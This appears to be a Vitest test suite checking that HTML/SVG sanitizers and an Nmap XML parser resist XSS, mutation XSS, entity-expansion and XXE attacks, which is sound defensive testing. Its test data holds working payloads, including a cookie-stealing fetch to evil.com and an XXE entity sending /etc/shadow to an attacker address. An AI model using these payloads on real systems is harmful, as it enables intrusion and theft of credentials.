import { describe, it, expect, vi } from 'vitest';
import { sanitizeHtml, sanitizeSvg } from '../../utils/securityUtils';
import { parseNmapXml } from '../../utils/scanParserUtils';

describe('Adversarial Stress Test: DOMPurify Sanitization & XML Entity Defenses', () => {
  // =========================================================================
  // SUITE 1: DOMPurify HTML Sanitization Engine (sanitizeHtml)
  // =========================================================================
  describe('sanitizeHtml — Adversarial XSS Stress Suite', () => {
    // Helper to inspect DOM element tree for prohibited artifacts
    function verifyDomNodeSafety(html: string): {
      elementsCount: number;
      scriptCount: number;
      iframeCount: number;
      objectCount: number;
      embedCount: number;
      onAttrCount: number;
      javascriptUriCount: number;
      styleCount: number;
    } {
      const container = document.createElement('div');
      container.innerHTML = html;

      let scriptCount = container.querySelectorAll('script').length;
      let iframeCount = container.querySelectorAll('iframe').length;
      let objectCount = container.querySelectorAll('object').length;
      let embedCount = container.querySelectorAll('embed').length;
      let styleCount = container.querySelectorAll('style').length;
      let onAttrCount = 0;
      let javascriptUriCount = 0;

      const allNodes = container.querySelectorAll('*');
      for (const el of Array.from(allNodes)) {
        for (const attr of Array.from(el.attributes)) {
          if (attr.name.toLowerCase().startsWith('on')) {
            onAttrCount++;
          }
          if (
            attr.value.toLowerCase().replace(/[\s\x00-\x1f]/g, '').includes('javascript:') ||
            attr.value.toLowerCase().replace(/[\s\x00-\x1f]/g, '').includes('data:text/html')
          ) {
            javascriptUriCount++;
          }
          if (attr.name.toLowerCase() === 'style') {
            styleCount++;
          }
        }
      }

      return {
        elementsCount: allNodes.length,
        scriptCount,
        iframeCount,
        objectCount,
        embedCount,
        onAttrCount,
        javascriptUriCount,
        styleCount,
      };
    }

    it('EMP-XSS-01: Neutralizes primary mandated XSS payloads', () => {
      const mandatedPayloads = [
        '<script>alert(1)</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)"><circle r="10"/></svg>',
        '<svg><script>alert(1)</script></svg>',
        '<a href="javascript:alert(1)">click</a>',
        '<iframe src="javascript:alert(1)"></iframe>',
      ];

      for (const payload of mandatedPayloads) {
        const sanitized = sanitizeHtml(payload);
        const domAudit = verifyDomNodeSafety(sanitized);

        expect(domAudit.scriptCount, `Script tag survived in: ${payload} -> ${sanitized}`).toBe(0);
        expect(domAudit.iframeCount, `Iframe survived in: ${payload} -> ${sanitized}`).toBe(0);
        expect(domAudit.onAttrCount, `on* attribute survived in: ${payload} -> ${sanitized}`).toBe(0);
        expect(domAudit.javascriptUriCount, `javascript: URI survived in: ${payload} -> ${sanitized}`).toBe(0);
        expect(sanitized).not.toContain('alert(1)');
      }
    });

    it('EMP-XSS-02: Strips comprehensive catalog of inline on* event handler variants', () => {
      const eventHandlers = [
        'onload', 'onerror', 'onclick', 'onmouseover', 'onmouseout', 'onmouseenter',
        'onmouseleave', 'onfocus', 'onblur', 'onchange', 'onsubmit', 'onreset',
        'onkeydown', 'onkeypress', 'onkeyup', 'ontoggle', 'onpointerdown', 'onpointerup',
        'onanimationstart', 'onanimationend', 'onwheel', 'onscroll', 'oncopy', 'oncut',
        'onpaste', 'oncontextmenu', 'ondblclick', 'ondrag', 'ondrop', 'onabort',
        'onbeforeunload', 'onhashchange', 'onpageshow', 'onpagehide', 'onresize'
      ];

      for (const handler of eventHandlers) {
        const payload = `<div ${handler}="alert('${handler}')" class="test-class">Text</div>`;
        const sanitized = sanitizeHtml(payload);
        const domAudit = verifyDomNodeSafety(sanitized);

        expect(domAudit.onAttrCount, `${handler} was not stripped: ${sanitized}`).toBe(0);
        expect(sanitized).not.toContain(handler + '=');
        expect(sanitized).not.toContain(`alert('${handler}')`);
      }
    });

    it('EMP-XSS-03: Neutralizes case-mutated, whitespace-padded, and obfuscated tags', () => {
      const obfuscatedPayloads = [
        '<sCrIpt>alert("case-variant")</sCrIpt>',
        '<SCRIPT/XSS SRC="https://evil.com/xss.js"></SCRIPT>',
        '<script \t\n\r>alert(1)</script>',
        '<img/src="x"/onerror="alert(2)">',
        '<IMG SRC=# ONERROR="alert(3)">',
        '<<SCRIPT>alert(4);//<</SCRIPT>',
        '<script<script>>alert(5)</script>',
        '<script src="data:text/javascript,alert(6)"></script>',
        '<IFRAME SRC="javascript:alert(7);"></IFRAME>',
        '<a/href="javascript&colon;alert(8)">click</a>',
        '<a href=" &#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(9) ">encoded link</a>',
        '<a href="jav&#x09;ascript:alert(10)">tab in protocol</a>',
        '<a href="jav&#x0A;ascript:alert(11)">newline in protocol</a>',
        '<a href="jav&#x0D;ascript:alert(12)">cr in protocol</a>',
      ];

      for (const payload of obfuscatedPayloads) {
        const sanitized = sanitizeHtml(payload);
        const domAudit = verifyDomNodeSafety(sanitized);

        expect(domAudit.scriptCount).toBe(0);
        expect(domAudit.iframeCount).toBe(0);
        expect(domAudit.onAttrCount).toBe(0);
        expect(domAudit.javascriptUriCount).toBe(0);
      }
    });

    it('EMP-XSS-04: Completely strips dangerous embedded resource containers and active styles', () => {
      const containerPayloads = [
        '<embed src="https://evil.corp/payload.swf">',
        '<object data="https://evil.corp/payload.swf"></object>',
        '<applet code="Malicious.class"></applet>',
        '<form action="https://evil.corp/login" method="POST"><input name="pass" /></form>',
        '<base href="https://evil.corp/">',
        '<link rel="stylesheet" href="https://evil.corp/leak.css">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<style>body { background: url("javascript:alert(1)"); }</style>',
        '<div style="background-image: url(javascript:alert(1));">content</div>',
        '<div style="expression(alert(1));">expression</div>',
      ];

      for (const payload of containerPayloads) {
        const sanitized = sanitizeHtml(payload);
        const domAudit = verifyDomNodeSafety(sanitized);

        expect(domAudit.embedCount).toBe(0);
        expect(domAudit.objectCount).toBe(0);
        expect(domAudit.styleCount).toBe(0);
        expect(sanitized).not.toMatch(/<(embed|object|applet|form|base|link|meta|style)/i);
        expect(sanitized).not.toMatch(/\sstyle\s*=/i);
      }
    });

    it('EMP-XSS-05: Defends against mXSS (mutation XSS) and malformed HTML nestings', () => {
      const mxssPayloads = [
        '<form><isindex formaction="javascript:alert(1)">',
        '<math><mtext><table><mglyph><style><!--</style><img src="x" onerror="alert(1)">',
        '<svg><style>{@import:url(//evil.com)}</style></svg>',
        '<table><form><input type="text" onfocus="alert(1)"></table>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<a href="javascript:\u0000alert(1)">Null-byte scheme</a>',
        '<img src="valid.jpg" alt="test" onerror="fetch(\'https://evil.com/cookie?c=\' + document.cookie)">',
      ];

      for (const payload of mxssPayloads) {
        const sanitized = sanitizeHtml(payload);
        const domAudit = verifyDomNodeSafety(sanitized);

        expect(domAudit.scriptCount).toBe(0);
        expect(domAudit.onAttrCount).toBe(0);
        expect(domAudit.javascriptUriCount).toBe(0);
        expect(sanitized).not.toContain('evil.com');
      }
    });

    it('EMP-XSS-06: Preserves legitimate Markdown HTML elements without mutilation', () => {
      const legitHtml = `
        <div class="prose max-w-none">
          <h1>Tactical Assessment Report</h1>
          <p>Target machine: <code>10.10.11.200</code>. Enumeration was conducted using <b>Rustscan</b>.</p>
          <blockquote>High-value target confirmed.</blockquote>
          <hr />
          <table>
            <thead>
              <tr><th>Port</th><th>State</th><th>Service</th></tr>
            </thead>
            <tbody>
              <tr><td>22/tcp</td><td>open</td><td>OpenSSH 8.9p1</td></tr>
              <tr><td>80/tcp</td><td>open</td><td>nginx 1.18.0</td></tr>
            </tbody>
          </table>
          <ul>
            <li>Initial reconnaissance: Completed</li>
            <li>Privilege escalation: Root obtained via SUID</li>
          </ul>
          <a href="https://github.com/0xdnd/ctf-tracker" target="_blank" rel="noopener noreferrer">Project Repo</a>
          <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIvPjwvc3ZnPg==" alt="Badge" width="10" height="10" />
        </div>
      `;

      const sanitized = sanitizeHtml(legitHtml);

      expect(sanitized).toContain('<h1>Tactical Assessment Report</h1>');
      expect(sanitized).toContain('<code>10.10.11.200</code>');
      expect(sanitized).toContain('<b>Rustscan</b>');
      expect(sanitized).toContain('<blockquote>High-value target confirmed.</blockquote>');
      expect(sanitized).toContain('<table>');
      expect(sanitized).toContain('<td>OpenSSH 8.9p1</td>');
      expect(sanitized).toContain('href="https://github.com/0xdnd/ctf-tracker"');
      expect(sanitized).toContain('alt="Badge"');
    });

    it('EMP-XSS-07: Robustness on extreme and non-string inputs', () => {
      expect(sanitizeHtml('')).toBe('');
      expect(sanitizeHtml('   ')).toBe('');
      expect(sanitizeHtml('\t\n\r  ')).toBe('');
      expect(sanitizeHtml('   <script>alert(1)</script>   ')).toBe('');
      expect(sanitizeHtml(null as unknown as string)).toBe('');
      expect(sanitizeHtml(undefined as unknown as string)).toBe('');
      expect(sanitizeHtml(1337 as unknown as string)).toBe('');
      expect(sanitizeHtml({} as unknown as string)).toBe('');
      expect(sanitizeHtml([] as unknown as string)).toBe('');
    });
  });

  // =========================================================================
  // SUITE 2: DOMPurify SVG Sanitization Engine (sanitizeSvg)
  // =========================================================================
  describe('sanitizeSvg — Adversarial SVG/Vector Stress Suite', () => {
    it('EMP-SVG-01: Neutralizes mandated SVG XSS attack vectors', () => {
      const maliciousSvgs = [
        '<svg onload="alert(1)"><circle r="10"/></svg>',
        '<svg><script>alert(1)</script></svg>',
        '<svg><circle cx="10" cy="10" r="5" onclick="alert(1)"/></svg>',
        '<svg><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>',
        '<svg><a href="javascript:alert(1)"><text>Click</text></a></svg>',
        '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>',
        '<svg><set onbegin="alert(1)" attributeName="x" to="10"/></svg>',
        '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>',
        '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
        '<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>',
        '<svg><foreignObject><img src="x" onerror="alert(1)"></foreignObject></svg>',
      ];

      for (const svg of maliciousSvgs) {
        const sanitized = sanitizeSvg(svg);

        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/<iframe/i);
        expect(sanitized).not.toMatch(/<animate/i);
        expect(sanitized).not.toMatch(/<set/i);
        expect(sanitized).not.toMatch(/\son[a-z]+\s*=/i);
        expect(sanitized).not.toMatch(/xlink:href=["']?\s*javascript:/i);
        expect(sanitized).not.toMatch(/href=["']?\s*javascript:/i);
      }
    });

    it('EMP-SVG-02: Preserves valid Mermaid tactical diagrams and SVG attributes', () => {
      const tacticalSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 200" width="400" height="200">
          <defs>
            <marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
              <path d="M 0 0 L 10 5 L 0 10 z" fill="#10B981"/>
            </marker>
          </defs>
          <g class="node" transform="translate(50, 50)">
            <rect width="100" height="40" rx="4" fill="#18181B" stroke="#10B981" stroke-width="2"/>
            <text x="50" y="25" text-anchor="middle" dominant-baseline="central" fill="#F4F4F5">DMZ Web</text>
          </g>
          <g class="node" transform="translate(250, 50)">
            <rect width="100" height="40" rx="4" fill="#18181B" stroke="#F59E0B" stroke-width="2"/>
            <text x="50" y="25" text-anchor="middle" dominant-baseline="central" fill="#F4F4F5">Internal DC</text>
          </g>
          <path d="M 150 70 L 250 70" stroke="#10B981" stroke-width="2" marker-end="url(#arrow)"/>
        </svg>
      `;

      const sanitized = sanitizeSvg(tacticalSvg);

      expect(sanitized).toContain('viewBox="0 0 400 200"');
      expect(sanitized).toContain('fill="#10B981"');
      expect(sanitized).toContain('dominant-baseline="central"');
      expect(sanitized).toContain('DMZ Web');
      expect(sanitized).toContain('Internal DC');
    });

    it('EMP-SVG-03: Handles invalid/empty SVG input safely', () => {
      expect(sanitizeSvg('')).toBe('');
      expect(sanitizeSvg('   ')).toBe('');
      expect(sanitizeSvg('\t\n\r  ')).toBe('');
      expect(sanitizeSvg('   <script>alert(1)</script>   ')).toBe('');
      expect(sanitizeSvg(null as unknown as string)).toBe('');
      expect(sanitizeSvg(undefined as unknown as string)).toBe('');
      expect(sanitizeSvg(42 as unknown as string)).toBe('');
    });

    it('EMP-SVG-04: Cross-verifies all 6 mandated payloads against sanitizeSvg', () => {
      const mandatedPayloads = [
        '<script>alert(1)</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)"><circle r="10"/></svg>',
        '<svg><script>alert(1)</script></svg>',
        '<a href="javascript:alert(1)">click</a>',
        '<iframe src="javascript:alert(1)"></iframe>',
      ];

      for (const payload of mandatedPayloads) {
        const sanitized = sanitizeSvg(payload);

        // Verification invariants: No script, no iframe, no on* attributes, no javascript: scheme
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/<iframe/i);
        expect(sanitized).not.toMatch(/\son[a-z]+\s*=/i);
        expect(sanitized).not.toMatch(/href=["']?\s*javascript:/i);
        expect(sanitized).not.toMatch(/xlink:href=["']?\s*javascript:/i);

        // Verify that mounting in DOM cannot execute script
        const container = document.createElement('div');
        container.innerHTML = sanitized;
        expect(container.querySelectorAll('script').length).toBe(0);
        expect(container.querySelectorAll('iframe').length).toBe(0);
        for (const el of Array.from(container.querySelectorAll('*'))) {
          for (const attr of Array.from(el.attributes)) {
            expect(attr.name.toLowerCase().startsWith('on')).toBe(false);
          }
        }
      }
    });
  });

  // =========================================================================
  // SUITE 3: Scan Parser XML Entity Defenses (parseNmapXml)
  // =========================================================================
  describe('parseNmapXml — Adversarial XML Entity Defenses & DoS Suite', () => {
    it('EMP-XML-01: Defends against classic Billion Laughs exponential entity expansion', () => {
      const billionLaughsPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<nmaprun scanner="nmap" args="nmap -p 22,80 10.10.10.10" version="7.94">
  <host>
    <address addr="10.10.10.10" addrtype="ipv4"/>
    <hostnames><hostname name="&lol9;"/></hostnames>
    <ports>
      <port protocol="tcp" portid="22">
        <state state="open"/>
        <service name="ssh" product="OpenSSH" version="9.0"/>
      </port>
      <port protocol="tcp" portid="80">
        <state state="open"/>
        <service name="http" product="nginx" version="1.24"/>
      </port>
    </ports>
  </host>
</nmaprun>`;

      const startTime = performance.now();
      const result = parseNmapXml(billionLaughsPayload);
      const elapsed = performance.now() - startTime;

      // Must complete rapidly (under 500ms) without CPU freeze or memory exhaustion
      expect(elapsed).toBeLessThan(500);

      expect(result).not.toBeNull();
      expect(result?.detectedIp).toBe('10.10.10.10');
      expect(result?.ports).toHaveLength(2);
      expect(result?.ports[0].port).toBe(22);
      expect(result?.ports[1].port).toBe(80);
      // Entity references should have been stripped or neutralized, not expanded to 10^9 strings
      if (result?.detectedHost) {
        expect(result.detectedHost).not.toContain('lol'.repeat(100));
      }
    });

    it('EMP-XML-02: Defends against external DTD parameter entities & SSRF/XXE vectors', () => {
      const xxeParameterEntityPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun SYSTEM "http://10.10.14.99:9999/evil.dtd" [
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///etc/shadow'>">
  <!ENTITY % payload SYSTEM "http://10.10.14.99:9999/exfil?d=%error;">
  %eval;
  %payload;
]>
<nmaprun scanner="nmap" args="nmap 192.168.1.50" version="7.94">
  <host>
    <status state="up"/>
    <address addr="192.168.1.50" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="445">
        <state state="open"/>
        <service name="microsoft-ds" product="Windows Server 2022"/>
      </port>
    </ports>
  </host>
</nmaprun>`;

      const startTime = performance.now();
      const result = parseNmapXml(xxeParameterEntityPayload);
      const elapsed = performance.now() - startTime;

      expect(elapsed).toBeLessThan(200);
      expect(result).not.toBeNull();
      expect(result?.detectedIp).toBe('192.168.1.50');
      expect(result?.ports[0].port).toBe(445);
      expect(result?.ports[0].service).toBe('microsoft-ds');
    });

    it('EMP-XML-03: Handles multi-line nested DTD subsets with internal bracket noise without hanging', () => {
      const noisyDtdXml = `<?xml version="1.0"?>
<!DOCTYPE nmaprun [
  <!-- [ Bracket inside comment [ ] ] -->
  <!ENTITY % nested "<!ENTITY internal 'test'>">
  <!ELEMENT host ANY>
  <!ATTLIST host id ID #IMPLIED>
]>
<nmaprun scanner="nmap">
  <host>
    <address addr="172.16.0.5" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="8080">
        <state state="open"/>
        <service name="http-proxy" product="Apache Tomcat" version="9.0.30"/>
      </port>
    </ports>
  </host>
</nmaprun>`;

      const startTime = performance.now();
      const result = parseNmapXml(noisyDtdXml);
      const elapsed = performance.now() - startTime;

      expect(elapsed).toBeLessThan(200);
      // Safe parsing: either parsed or safely returned null (due to bracket noise syntax error), never threw
      expect(result === null || result.detectedIp === '172.16.0.5').toBe(true);
    });

    it('EMP-XML-04: Resists quadratic blowup entity expansion payloads', () => {
      // 50,000 char entity referenced 100 times
      const hugeChunk = 'A'.repeat(50000);
      const quadraticPayload = `<?xml version="1.0"?>
<!DOCTYPE nmaprun [
  <!ENTITY big "${hugeChunk}">
]>
<nmaprun scanner="nmap">
  <host>
    <address addr="10.0.0.1" addrtype="ipv4"/>
    <hostnames><hostname name="${'&big;'.repeat(100)}"/></hostnames>
    <ports>
      <port protocol="tcp" portid="21"><state state="open"/><service name="ftp"/></port>
    </ports>
  </host>
</nmaprun>`;

      const startTime = performance.now();
      const result = parseNmapXml(quadraticPayload);
      const elapsed = performance.now() - startTime;

      expect(elapsed).toBeLessThan(300);
      expect(result).not.toBeNull();
      expect(result?.detectedIp).toBe('10.0.0.1');
      expect(result?.ports[0].port).toBe(21);
    });

    it('EMP-XML-05: Safely parses XML with unclosed or truncated DTD constructs without uncaught crashes', () => {
      const truncatedPayloads = [
        '<?xml version="1.0"?><!DOCTYPE nmaprun [ <!ENTITY unclosed "incomplete',
        '<!DOCTYPE nmaprun [',
        '<!DOCTYPE nmaprun [ ]',
        '<?xml version="1.0"?><!DOCTYPE [ ]><nmaprun></nmaprun>',
        '<?xml version="1.0"?><nmaprun><host><address addr="10.10.10.1"/></host>',
        '<!ENTITY standalone "test">',
      ];

      for (const payload of truncatedPayloads) {
        expect(() => {
          const res = parseNmapXml(payload);
          // Truncated XML should return null or safe result, never throw an uncaught exception
          expect(res === null || typeof res === 'object').toBe(true);
        }).not.toThrow();
      }
    });

    it('EMP-XML-06: Preserves legitimate XML predefined entities and numeric entities in valid scans', () => {
      const validXmlWithEntities = `<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sV -sC target" version="7.94">
  <host>
    <address addr="10.20.30.40" addrtype="ipv4"/>
    <hostnames><hostname name="test &amp; lab &apos;alpha&apos;" type="user"/></hostnames>
    <ports>
      <port protocol="tcp" portid="80">
        <state state="open"/>
        <service name="http" product="Apache &quot;Secure&quot; &lt;Web&gt; Server" version="2.4.50"/>
      </port>
    </ports>
  </host>
</nmaprun>`;

      const result = parseNmapXml(validXmlWithEntities);
      expect(result).not.toBeNull();
      expect(result?.detectedIp).toBe('10.20.30.40');
      expect(result?.detectedHost).toBe("test & lab 'alpha'");
      expect(result?.ports[0].port).toBe(80);
      expect(result?.ports[0].version).toContain('Apache "Secure" <Web> Server');
    });

    it('EMP-XML-07: Resists catastrophic regex backtracking (ReDoS) on large XML streams', () => {
      // Craft a 500KB input with repeated DTD-like brackets designed to test regex greediness
      const repeatingPrefix = '<!DOCTYPE nmaprun ['.repeat(100);
      const repeatingEntities = ' <!ENTITY foo "bar"> '.repeat(1000);
      const repeatingSuffix = '] >'.repeat(100);
      const largeXml = `<?xml version="1.0"?>
${repeatingPrefix}
${repeatingEntities}
${repeatingSuffix}
<nmaprun scanner="nmap">
  <host>
    <address addr="10.99.99.99" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="53"><state state="open"/><service name="domain"/></port>
    </ports>
  </host>
</nmaprun>`;

      const startTime = performance.now();
      const result = parseNmapXml(largeXml);
      const elapsed = performance.now() - startTime;

      expect(elapsed).toBeLessThan(1000);
      expect(result === null || result.detectedIp === '10.99.99.99').toBe(true);
    });

    it('EMP-XML-08: Resists recursive and circular parameter entity definitions (%pe;)', () => {
      const circularPeXml = `<?xml version="1.0"?>
<!DOCTYPE nmaprun [
  <!ENTITY % a "%b;">
  <!ENTITY % b "%a;">
  %a;
]>
<nmaprun scanner="nmap">
  <host>
    <address addr="10.10.10.250" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="22"><state state="open"/><service name="ssh"/></port>
    </ports>
  </host>
</nmaprun>`;

      const startTime = performance.now();
      const result = parseNmapXml(circularPeXml);
      const elapsed = performance.now() - startTime;

      expect(elapsed).toBeLessThan(100);
      expect(result).not.toBeNull();
      expect(result?.detectedIp).toBe('10.10.10.250');
      expect(result?.ports[0].port).toBe(22);
    });

    it('EMP-XML-09: Stress endurance on 1MB+ massive XML payload stream', () => {
      // Create massive valid Nmap XML with 500 ports
      const portsXml = Array.from({ length: 500 }, (_, i) => `
        <port protocol="tcp" portid="${i + 1}">
          <state state="open"/>
          <service name="svc-${i}" product="Product-${i}" version="v1.${i}"/>
        </port>
      `).join('');

      const hugeValidXml = `<?xml version="1.0"?>
<nmaprun scanner="nmap" args="nmap -p 1-500 10.10.10.99" version="7.94">
  <host>
    <address addr="10.10.10.99" addrtype="ipv4"/>
    <ports>
      ${portsXml}
    </ports>
  </host>
</nmaprun>`;

      const startTime = performance.now();
      const result = parseNmapXml(hugeValidXml);
      const elapsed = performance.now() - startTime;

      expect(elapsed).toBeLessThan(3000);
      expect(result).not.toBeNull();
      expect(result?.detectedIp).toBe('10.10.10.99');
      expect(result?.ports).toHaveLength(500);
    });
  });

  // =========================================================================
  // SUITE 4: Real Browser DOM Execution Oracles
  // =========================================================================
  describe('DOM Execution Oracles — Live Execution & Handler Verification', () => {
    it('EMP-ORACLE-01: Zero execution when injecting all mandated XSS payloads into live DOM', () => {
      let executionCaught = false;
      const originalAlert = window.alert;
      window.alert = () => { executionCaught = true; };

      const mandatedPayloads = [
        '<script>alert(1)</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)"><circle r="10"/></svg>',
        '<svg><script>alert(1)</script></svg>',
        '<a href="javascript:alert(1)">click</a>',
        '<iframe src="javascript:alert(1)"></iframe>',
      ];

      try {
        for (const payload of mandatedPayloads) {
          const sanitizedHtml = sanitizeHtml(payload);
          const sanitizedSvg = sanitizeSvg(payload);

          // Test HTML rendering container
          const div = document.createElement('div');
          div.innerHTML = sanitizedHtml;
          document.body.appendChild(div);

          // Trigger click on all anchors and buttons
          const interactables = div.querySelectorAll('a, button');
          interactables.forEach((el) => {
            el.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
          });

          // Test SVG rendering container
          const svgDiv = document.createElement('div');
          svgDiv.innerHTML = sanitizedSvg;
          document.body.appendChild(svgDiv);

          const svgInteractables = svgDiv.querySelectorAll('a, circle, text');
          svgInteractables.forEach((el) => {
            el.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
          });

          document.body.removeChild(div);
          document.body.removeChild(svgDiv);
        }

        expect(executionCaught).toBe(false);
      } finally {
        window.alert = originalAlert;
      }
    });

    it('EMP-ORACLE-02: Zero on* event handlers remain on any element in sanitized DOM trees', () => {
      const complexHostileBlock = `
        <div id="wrapper" onmouseover="alert('div')" onclick="alert('div')">
          <h1 onload="alert('h1')">Title</h1>
          <p oncopy="alert('copy')">Paragraph with <span oncut="alert('span')">cut</span></p>
          <a href="javascript:void(0)" onclick="alert('a')">Link</a>
          <button onfocus="alert('btn')" onblur="alert('btn')">Button</button>
          <input type="text" onkeydown="alert('key')" onchange="alert('change')" value="123" />
          <details open ontoggle="alert('toggle')">
            <summary onclick="alert('summary')">Summary</summary>
            Content
          </details>
          <svg onload="alert('svg')" onclick="alert('svg')">
            <circle cx="5" cy="5" r="5" onmouseover="alert('circle')" />
          </svg>
        </div>
      `;

      const cleanHtml = sanitizeHtml(complexHostileBlock);
      const testBed = document.createElement('div');
      testBed.innerHTML = cleanHtml;
      document.body.appendChild(testBed);

      const allElements = testBed.querySelectorAll('*');
      expect(allElements.length).toBeGreaterThan(0);

      for (const el of Array.from(allElements)) {
        for (const attr of Array.from(el.attributes)) {
          expect(
            attr.name.toLowerCase().startsWith('on'),
            `Prohibited event handler attribute '${attr.name}' found on <${el.tagName}>!`
          ).toBe(false);
        }
      }

      document.body.removeChild(testBed);
    });
  });
});

